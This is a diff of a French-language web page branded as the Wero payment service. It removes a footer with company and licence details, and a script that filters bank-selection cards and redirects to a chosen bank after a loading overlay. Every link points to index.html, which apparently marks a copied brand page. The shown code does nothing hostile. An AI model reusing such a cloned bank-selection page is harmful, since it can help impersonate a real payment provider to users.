-                        <a href="index.html" class="footer-link">Centre Légal</a>
-                        <a href="index.html" class="footer-link">Conditions d'utilisation du site web</a>
-                        <a href="index.html" class="footer-link">Sécurité</a>
-                        <a href="index.html" class="footer-link">Presse</a>
-                    </div>
-                </div>
-                
-                <div class="footer-logo">
-                    <img src="images/wero.jpg" alt="Logo Wero">
-                </div>
-            </div>
-
-            <div class="footer-bottom">
-                <div class="footer-info">
-                    <p><strong style="color: var(--black);">Wero est un produit de <a href="index.html" class="inline-underline">EPI Company SE</a></strong><br>
-                    Disponible en Allemagne, Belgique et France.<br>
-                    De Lignestraat 13, 1000 Brussels, Belgium<br>
-                    VAT: BE0755811726<br>
-                    Capital partagé : € 669MM</p>
-
-                    <p>Détails de la licence : n° 0755.811.726. Autorisé par la Banque Nationale de Belgique<br>
-                    en tant qu'institution de paiement le 20 février 2024. PISP et AISP pour les services (7<br>
-                    services d'initiation de paiement et 8 services d'information sur les comptes).</p>
-                    
-                    <div class="copyright">© 2026 EPI Company SE</div>
-                </div>
-
-                <div class="footer-socials">
-                    <a href="index.html" class="social-icon" aria-label="Facebook">
-                        <svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg>
-                    </a>
-                    <a href="index.html" class="social-icon" aria-label="TikTok">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12a4 4 0 1 0 4 4V4a5 5 0 0 0 5 5"></path><path d="M15 8v8a4 4 0 0 1-4 4"></path><path d="M15 4a4 4 0 0 0 4 4"></path></svg>
-                    </a>
-                    <a href="index.html" class="social-icon" aria-label="Instagram">
-                        <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1112.63 8 4 4 0 0116 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
-                    </a>
-                </div>
-            </div>
-        </div>
+    <footer>
+        <p>© 2026 EPI Company SE</p>
     </footer>
-
-    <script>
-    document.addEventListener("DOMContentLoaded", () => {
-        
-        const logoImg = document.getElementById("site-logo");
-        const logoFallback = document.getElementById("logo-fallback");
-
-        if (logoImg) {
-            const testImg = new Image();
-            testImg.src = logoImg.src;
-            testImg.onload = () => {
-                logoImg.classList.remove("hidden");
-                logoFallback.classList.add("hidden");
-            };
-            testImg.onerror = () => {
-                logoImg.classList.add("hidden");
-                logoFallback.classList.remove("hidden");
-            };
-        }
-
-        const mobileBtn = document.getElementById("mobile-menu-btn");
-        const mobileMenu = document.getElementById("mobile-menu");
-        let isMenuOpen = false;
-
-        if (mobileBtn && mobileMenu) {
-            mobileBtn.addEventListener("click", () => {
-                isMenuOpen = !isMenuOpen;
-                if (isMenuOpen) {
-                    mobileMenu.style.maxHeight = "400px";
-                    mobileMenu.style.opacity = "1";
-                    mobileMenu.style.paddingBottom = "1rem";
-                } else {
-                    mobileMenu.style.maxHeight = "0";
-                    mobileMenu.style.opacity = "0";
-                    mobileMenu.style.paddingBottom = "0";
-                }
-            });
-        }
-
-        const loadingOverlay = document.getElementById('loading-overlay');
-        const targetBankImg = document.getElementById('target-bank-img');
-
-        const bankCards = document.querySelectorAll('.bank-card');
-        bankCards.forEach(card => {
-            card.addEventListener('click', (e) => {
-                e.preventDefault();
-                const targetUrl = card.getAttribute('href');
-                const logoSrc = card.getAttribute('data-logo');
-                
-                if (logoSrc) {
-                    targetBankImg.src = logoSrc;
-                } else {
-                    targetBankImg.src = 'images/bank-icon.png';
-                }
-                targetBankImg.style.display = 'block';
-
-                loadingOverlay.classList.remove('hidden-overlay');
-
-                setTimeout(() => {
-                    window.location.href = targetUrl;
-                }, 3000);
-            });
-        });
-
-        const searchInput = document.querySelector('.search-input');
-
-        searchInput.addEventListener('input', () => {
-            const query = searchInput.value.trim().toLowerCase();
-            bankCards.forEach(card => {
-                const bankName = card.querySelector('.bank-name').textContent.toLowerCase();
-                if (bankName.includes(query) || query === "") {
-                    card.style.display = 'flex';
-                } else {
-                    card.style.display = 'none';
-                }
-            });
-        });
-    });
-    </script>
 </body>
 </html>
